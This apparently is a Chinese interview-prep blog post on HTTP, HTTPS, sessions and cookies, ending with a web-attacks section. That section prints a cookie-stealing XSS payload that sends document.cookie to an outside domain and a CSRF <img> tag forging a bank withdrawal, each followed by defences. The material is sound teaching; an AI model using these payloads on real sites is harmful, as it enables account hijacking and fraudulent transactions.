<p><strong>安全性</strong>HTTP协议运行在TCP之上，弊端：1.所有传输的内容都是明文。2.客户端和服务器端都无法验证对方的身份。3.无法保证资源是否被篡改</p>
<p>HTTPS是运行在SSL/TLS之上的HTTP协议，SSL/TLS 运行在TCP之上。采用<strong>混合加密+数字证书认证机构+MAC的报文摘要</strong>。HTTPS采用混合加密机制，加密采用对称加密，但对称加密的密钥用服务器方的证书进行了非对称加密。</p>
<p><strong>资源消耗</strong>：加密通信会耗费更多服务器资源，速度也会变慢。在包含个人信息等敏感数据时</p>
<h2 id="HTTPS的流程？"><a href="#HTTPS的流程？" class="headerlink" title="HTTPS的流程？"></a>HTTPS的流程？</h2><h2 id="HTTP有哪些请求方法？它们的作用或者说应用场景？"><a href="#HTTP有哪些请求方法？它们的作用或者说应用场景？" class="headerlink" title="HTTP有哪些请求方法？它们的作用或者说应用场景？"></a>HTTP有哪些请求方法？它们的作用或者说应用场景？</h2><p>GET: 请求指定的页面信息，并返回实体主体。</p>
<p>HEAD: 和GET类似，只不过不返回报文主体，只返回响应首部。可用于确认URI的有效性及资源更新的日期时间；</p>
<p>POST: 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。</p>
<p>PUT: 用来传输文件，要求请求报文的主体中包含文件内容，然后保存到请求URI指定的位置。</p>
<p>DELETE: 和PUT相反，按请求URI删除指定的资源。</p>
<p>OPTIONS: 用来查询针对请求URI指定的资源支持的方法。如果请求成功，会有一个Allow的头包含类似“GET,POST”这样的信息</p>
<p>TRACE: 让服务端将之前的请求通信返回给客户端的方法（因此客户端可以得知请求是怎么一步步到服务端的）。主要用于测试或诊断。</p>
<p>CONNECT: 使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</p>
<h2 id="请求转发与重定向区别"><a href="#请求转发与重定向区别" class="headerlink" title="请求转发与重定向区别"></a>请求转发与重定向区别</h2><p><strong>转发是服务器行为，重定向是客户端行为。</strong></p>
<h3 id="请求转发"><a href="#请求转发" class="headerlink" title="请求转发"></a>请求转发</h3><ul>
<li>转发过程：浏览器发送http请求——》服务器接受此请求——》调用内部的一个方法在容器内部完成请求处理和转发动作——》将目标资源发送给浏览器；</li>
<li>必须是同一个web容器下的url，中间传递的是自己的容器内的request。</li>
<li>浏览器路径栏：显示第一次访问的路径，客户是感觉不到服务器做了转发的。转</li>
<li>传输的信息不会丢失。</li>
</ul>
<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><ul>
<li>重定向过程：客户浏览器发送http请求——》web服务器接受后发送302状态码响应及对应新的location给客户浏览器——》客户浏览器发现是302响应，则<strong>自动</strong>再发送一个新的http请求，请求url是新的location地址——》服务器根据此请求寻找资源并发送给客户。</li>
<li>可以重定向到任意URL，既然是浏览器重新发出了请求，则就没有什么request传递的概念了。</li>
<li>浏览器路径栏：显示的是其重定向的路径，客户可以观察到地址的变化的。</li>
<li>重定向，其实是至少两次request</li>
</ul>
<blockquote>
<p><a href="https://www.cnblogs.com/yqin/archive/2010/06/07/1810454.html" target="_blank" rel="noopener">HTTP中的重定向和请求转发的区别</a></p>
</blockquote>
<h1 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h1><h2 id="cookie和session区别和联系？"><a href="#cookie和session区别和联系？" class="headerlink" title="cookie和session区别和联系？"></a>cookie和session区别和联系？</h2><ol>
<li>保存地方。Session是在<strong>服务端保存</strong>的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；Cookie是<strong>客户端保存</strong>用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。</li>
<li>实现原理。session的运行依赖session id，而session id是存在cookie中的，也就是说，如果浏览器禁用了cookie ，同时session也会失效（但是可以通过url重写，即在url中传递session_id）</li>
<li>大小。cookie最多为 300个 , 并且每个不能超过 4KB,每个 Web 站点能设置的 Cookie 总数不能超过 20个。session当访问增多，会比较占用你服务器的性能。</li>
<li>安全。cookie不安全，可以通过XSS跨域攻击窃取</li>
</ol>
<p>总的来说，cookie是钥匙，session是盒子。</p>
<h2 id="session的原理？"><a href="#session的原理？" class="headerlink" title="session的原理？"></a>session的原理？</h2><p>Session会话指的是从用户打开浏览器访问一个网站开始，无论在这个网站中访问了多少页面，点击了多少链接，都属于同一个会话。 直到该用户关闭浏览器为止，都属于同一个会话。比如网上购物，每个用户有自己的购物车，当点击下单时，由于HTTP协议无状态，并不知道是哪个用户操作的，所以服务端要为特定的用户创建特定的Session，用于标识这个用户，并且跟踪用户。</p>
<p>Session原理：浏览器第一次访问服务器时，服务器会响应一个cookie给浏览器。这个cookie记录的就是sessionId，之后每次访问携带着这个sessionId，服务器里查询该sessionId，便可以识别并跟踪特定的用户了。</p>
<p>Cookie原理：第一次访问服务器，服务器响应时，要求浏览器记住一个信息。之后浏览器每次访问服务器时候，携带第一次记住的信息访问。相当于服务器识别客户端的一个通行证。</p>
<p>Cookie不可跨域，浏览览器判断一个网站是否能操作另一个网站Cookie的依据是域名。Google与Baidu的域名不一样，因此Google不能操作Baidu的Cookie，换句话说Google只能操作Google的Cookie。</p>
<h1 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h1><h2 id="一、跨站脚本攻击（document-cookie）"><a href="#一、跨站脚本攻击（document-cookie）" class="headerlink" title="一、跨站脚本攻击（document.cookie）"></a>一、跨站脚本攻击（document.cookie）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>之后该内容可能会被渲染成以下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>
<p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p>
<h4 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h4><h5 id="1-设置-Cookie-为-HttpOnly，防止-脚本调用"><a href="#1-设置-Cookie-为-HttpOnly，防止-脚本调用" class="headerlink" title="1. 设置 Cookie 为 HttpOnly，防止 脚本调用"></a>1. 设置 Cookie 为 HttpOnly，防止 脚本调用</h5><p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p>
<h5 id="2-过滤特殊字符"><a href="#2-过滤特殊字符" class="headerlink" title="2. 过滤特殊字符"></a>2. 过滤特殊字符</h5><p>例如将 <code>&lt;</code> <strong>转义</strong>为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p>
<p>富文本编辑器允许用户输入 HTML 代码，通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。比如form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p>
<h2 id="二、跨站请求伪造（登录信息尚未过期）"><a href="#二、跨站请求伪造（登录信息尚未过期）" class="headerlink" title="二、跨站请求伪造（登录信息尚未过期）"></a>二、跨站请求伪造（登录信息尚未过期）</h2><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>假如一家银行用以执行转账操作的 URL 地址如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。</span><br></pre></td></tr></table></figure>
<p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。</span><br></pre></td></tr></table></figure>
<p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，<strong>登录信息尚未过期</strong>，那么她就会损失 1000 美元。（两个刚好，刚好有账户名为李华的人，刚好登陆信息没有过期）</p>
<p>由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。如发邮件，发消息，甚至财产操作如转账和购买商品。他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
<p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是<strong>欺骗用户浏览器，让其以用户的名义执行操作。</strong></p>
<p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p>
<h4 id="防范手段-1"><a href="#防范手段-1" class="headerlink" title="防范手段"></a>防范手段</h4><h5 id="1-标识请求来源的地址"><a href="#1-标识请求来源的地址" class="headerlink" title="1. 标识请求来源的地址"></a>1. 标识请求来源的地址</h5><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求<strong>来源的地址在同一个域名</strong>下，可以极大的防止 CSRF 攻击。但存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p>
<h5 id="2-添加校验-Token，生成随机数"><a href="#2-添加校验-Token，生成随机数" class="headerlink" title="2. 添加校验 Token，生成随机数"></a>2. 添加校验 Token，生成随机数</h5><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p>
<h5 id="3-输入验证码"><a href="#3-输入验证码" class="headerlink" title="3. 输入验证码"></a>3. 输入验证码</h5><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p>
<h2 id="三、SQL-注入攻击"><a href="#三、SQL-注入攻击" class="headerlink" title="三、SQL 注入攻击"></a>三、SQL 注入攻击</h2><h3 id="1-使用参数化查询"><a href="#1-使用参数化查询" class="headerlink" title="1. 使用参数化查询"></a>1. 使用参数化查询</h3><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PreparedStatement stmt = connection.prepareStatement(&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;);</span><br><span class="line">stmt.setString(1, userid);</span><br><span class="line">stmt.setString(2, password);</span><br><span class="line">ResultSet rs = stmt.executeQuery();</span><br></pre></td></tr></table></figure>
<h2 id="四、拒绝服务攻击"><a href="#四、拒绝服务攻击" class="headerlink" title="四、拒绝服务攻击"></a>四、拒绝服务攻击</h2><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p>
<p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/10/06/数据库/" rel="next" title="数据库——秋招复习笔记">
                <i class="fa fa-chevron-left"></i> 数据库——秋招复习笔记
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/10/09/循环依赖/" rel="prev" title="Spring怎么解决循环依赖？">
                Spring怎么解决循环依赖？ <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">
      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Moonlight">
            
              <p class="site-author-name" itemprop="name">Moonlight</p>
              <p class="site-description motion-element" itemprop="description">并非因为有了结束， 过程才具有意义。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">39</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">13</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/wangxuanni" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="xiantang.info" title="咸糖" target="_blank">咸糖</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://zmosquito.github.io" title="蚊子" target="_blank">蚊子</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#TCP"><span class="nav-number">1.</span> <span class="nav-text">TCP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#三次握手？四次挥手？"><span class="nav-number">1.1.</span> <span class="nav-text">三次握手？四次挥手？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#三次握手"><span class="nav-number">1.1.1.</span> <span class="nav-text">三次握手</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四次挥手"><span class="nav-number">1.1.2.</span> <span class="nav-text">四次挥手</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他问题"><span class="nav-number">1.1.3.</span> <span class="nav-text">其他问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TCP为什么需要三次握手？两次不行吗？"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">TCP为什么需要三次握手？两次不行吗？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#四次挥手，为什么客户端发送确认后还需要等待2MSL"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">四次挥手，为什么客户端发送确认后还需要等待2MSL?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#为什么会出现大量的close-wait？"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">为什么会出现大量的close-wait？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SYN-Floold攻击-SYN洪水攻击-？"><span class="nav-number">1.1.3.4.</span> <span class="nav-text">SYN Floold攻击 (SYN洪水攻击)？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#client故障了怎么办？"><span class="nav-number">1.1.3.5.</span> <span class="nav-text">client故障了怎么办？</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TCP和UDP的区别？"><span class="nav-number">1.2.</span> <span class="nav-text">TCP和UDP的区别？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#可靠传输？流量控制？拥塞控制？"><span class="nav-number">1.3.</span> <span class="nav-text">可靠传输？流量控制？拥塞控制？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网络协议"><span class="nav-number">2.</span> <span class="nav-text">网络协议</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#网络的7层模型了解吗？"><span class="nav-number">2.1.</span> <span class="nav-text">网络的7层模型了解吗？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#有了传输层为什么还需要网络层？"><span class="nav-number">2.2.</span> <span class="nav-text">有了传输层为什么还需要网络层？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#主机A向主机B发送数据，在这个过程中，传输层和网络层做了什么？"><span class="nav-number">2.3.</span> <span class="nav-text">主机A向主机B发送数据，在这个过程中，传输层和网络层做了什么？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTTP"><span class="nav-number">3.</span> <span class="nav-text">HTTP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#浏览器发起HTTP请求后发生了什么？"><span class="nav-number">3.1.</span> <span class="nav-text">浏览器发起HTTP请求后发生了什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS域名解析的请求过程？"><span class="nav-number">3.2.</span> <span class="nav-text">DNS域名解析的请求过程？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#请求和响应的报文结构（格式）？"><span class="nav-number">3.3.</span> <span class="nav-text">请求和响应的报文结构（格式）？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GET与POST的对比，或者说区别？"><span class="nav-number">3.4.</span> <span class="nav-text">GET与POST的对比，或者说区别？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见的状态码？"><span class="nav-number">3.5.</span> <span class="nav-text">常见的状态码？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-1-0和HTTP-1-1的主要区别是什么？"><span class="nav-number">3.6.</span> <span class="nav-text">HTTP 1.0和HTTP 1.1的主要区别是什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Http长连接是什么？"><span class="nav-number">3.7.</span> <span class="nav-text">Http长连接是什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP和-HTTPS的区别？"><span class="nav-number">3.8.</span> <span class="nav-text">HTTP和 HTTPS的区别？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTPS的流程？"><span class="nav-number">3.9.</span> <span class="nav-text">HTTPS的流程？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP有哪些请求方法？它们的作用或者说应用场景？"><span class="nav-number">3.10.</span> <span class="nav-text">HTTP有哪些请求方法？它们的作用或者说应用场景？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#请求转发与重定向区别"><span class="nav-number">3.11.</span> <span class="nav-text">请求转发与重定向区别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#请求转发"><span class="nav-number">3.11.1.</span> <span class="nav-text">请求转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#重定向"><span class="nav-number">3.11.2.</span> <span class="nav-text">重定向</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SESSION"><span class="nav-number">4.</span> <span class="nav-text">SESSION</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie和session区别和联系？"><span class="nav-number">4.1.</span> <span class="nav-text">cookie和session区别和联系？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#session的原理？"><span class="nav-number">4.2.</span> <span class="nav-text">session的原理？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网络攻击"><span class="nav-number">5.</span> <span class="nav-text">网络攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、跨站脚本攻击（document-cookie）"><span class="nav-number">5.1.</span> <span class="nav-text">一、跨站脚本攻击（document.cookie）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#防范手段"><span class="nav-number">5.1.0.1.</span> <span class="nav-text">防范手段</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-设置-Cookie-为-HttpOnly，防止-脚本调用"><span class="nav-number">5.1.0.1.1.</span> <span class="nav-text">1. 设置 Cookie 为 HttpOnly，防止 脚本调用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-过滤特殊字符"><span class="nav-number">5.1.0.1.2.</span> <span class="nav-text">2. 过滤特殊字符</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、跨站请求伪造（登录信息尚未过期）"><span class="nav-number">5.2.</span> <span class="nav-text">二、跨站请求伪造（登录信息尚未过期）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击原理"><span class="nav-number">5.2.0.1.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防范手段-1"><span class="nav-number">5.2.0.2.</span> <span class="nav-text">防范手段</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-标识请求来源的地址"><span class="nav-number">5.2.0.2.1.</span> <span class="nav-text">1. 标识请求来源的地址</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-添加校验-Token，生成随机数"><span class="nav-number">5.2.0.2.2.</span> <span class="nav-text">2. 添加校验 Token，生成随机数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-输入验证码"><span class="nav-number">5.2.0.2.3.</span> <span class="nav-text">3. 输入验证码</span></a></li></ol></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#三、SQL-注入攻击"><span class="nav-number">5.3.</span> <span class="nav-text">三、SQL 注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-使用参数化查询"><span class="nav-number">5.3.1.</span> <span class="nav-text">1. 使用参数化查询</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、拒绝服务攻击"><span class="nav-number">5.4.</span> <span class="nav-text">四、拒绝服务攻击</span></a></li></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Moonlight</span>

  
</div>


  <div class="powered-by">  
  </div>
  <span>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></span>
</div>
<!-- 
<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
-->




        







        
      </footer></div>
    

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: true,
        appId: '8mVebIc8A5BSLnOwM58Kjqnm-gzGzoHsz',
        appKey: 'gdBaeDvg94MR2FENCtcLLbIf',
        placeholder: 'ヾﾉ≧∀≦)o来啊，来玩啊!',
        avatar:'',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
